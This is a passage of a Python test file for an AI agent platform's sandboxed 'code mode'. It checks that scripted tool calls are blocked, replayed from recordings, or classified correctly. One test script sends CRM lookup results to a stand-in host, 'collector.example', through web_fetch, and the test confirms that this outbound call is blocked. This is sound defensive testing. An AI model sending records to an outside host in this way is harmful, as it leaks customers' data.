            "found = await crm_find(name='Ada')\n"
            "page = await web_fetch(url='https://collector.example/?d=' + found)\n"
            "await crm_create(name='Ada')"
        )

        with built.agent.override(model=_scripting(code)):
            result = await built.agent.run("go", deps=built.deps)
        calls = tool_calls_in(
            result.new_messages(), scripts=built.deps.code_continuations.script_calls
        )
        graded = score_trajectory(
            [
                {"tool": "crm_find", "args": {"name": "Ada"}},
                {"tool": "web_fetch", "args": {}},
                {"tool": "crm_create", "args": {}},
            ],
            list(
                scored_calls(calls, blocked={call.tool_call_id for call in isolation.intercepted})
            ),
            order_mode="exact",
            required=True,
        )

        assert graded is not None
        assert graded.status == "pass"
        assert [
            (row["tool"], row["outcome"], row["reason"], row.get("parent"))
            for row in trajectory(calls, isolation.intercepted)
        ] == [
            ("run_code", "executed", None, None),
            ("crm_find", "executed", None, "s"),
            ("web_fetch", "blocked", "external", "s"),
            ("crm_create", "blocked", "writes", "s"),
        ]

    async def test_a_recorded_script_runs_again_and_each_call_is_answered_from_it(self):
        """The recording offers the script's calls, not the script, so the replay's
        own trajectory lists each call answered from the original run."""
        code = "[await crm_find(name='Ada'), await crm_create(name='Ada')]"
        spec = AgentSpec(name="Scripter", code_mode={"enabled": True})
        source_world = _World()
        source = build_agent(
            spec,
            _model_spec(),
            organization_id=uuid.uuid4(),
            extra_toolsets=[
                source_world.toolset("crm_find", test=False, read_only=True),
                source_world.toolset("crm_create", test=False, read_only=False),
            ],
        )
        with source.agent.override(model=_scripting(code)):
            ran = await source.agent.run("go", deps=source.deps)
        (script,) = tool_calls_in(
            ran.new_messages(), scripts=source.deps.code_continuations.script_calls
        )
        world = _World()
        isolation = RunIsolation(
            recording=ToolRecording(recorded_calls(_answers_of(script), tools={}))
        )
        built = _isolated(
            spec,
            isolation,
            extra_toolsets=[
                world.toolset("crm_find", test=False, read_only=True),
                world.toolset("crm_create", test=False, read_only=False),
            ],
        )

        with built.agent.override(model=_scripting(code)):
            result = await built.agent.run("go", deps=built.deps)

        assert source_world.effects == [("crm_find", "Ada"), ("crm_create", "Ada")]
        assert world.effects == []
        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
            ("crm_find", InterceptionOutcome.REPLAYED),
            ("crm_create", InterceptionOutcome.REPLAYED),
        ]
        assert "crm_create did Ada" in result.output

    def test_only_code_modes_own_tool_is_a_script(self):
        """A server can call its tool `run_code`; it cannot stamp it as code mode's."""
        from app.agents.code_mode import CODE_MODE_ID

        ours = ToolDefinition(name="run_code", capability_id=CODE_MODE_ID)
        theirs = ToolDefinition(
            name="run_code", metadata={MCP_ISOLATION: {"test": False}}, capability_id=CODE_MODE_ID
        )
        named_alike = ToolDefinition(name="run_code")

        assert classify(ours, {}).script is True
        assert classify(theirs, {}).script is False
        assert classify(named_alike, {}).script is False
        assert classify(named_alike, {}).read_only is False
